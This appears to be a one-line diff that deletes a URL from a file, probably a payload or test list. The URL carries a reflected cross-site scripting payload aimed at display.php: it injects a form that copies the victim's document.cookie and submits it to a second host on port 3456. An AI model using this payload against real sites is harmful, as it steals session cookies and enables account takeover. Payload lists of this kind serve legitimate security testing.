@@ -1,1 +1,0 @@
-http://192.168.10.109/data/store/catalog/display.php?key1="></form><form name=x action=http://192.168.10.152:3456><input name=y value=z><script>document.x.y.value=document.cookie;document.x.submit();<%2Fscript><
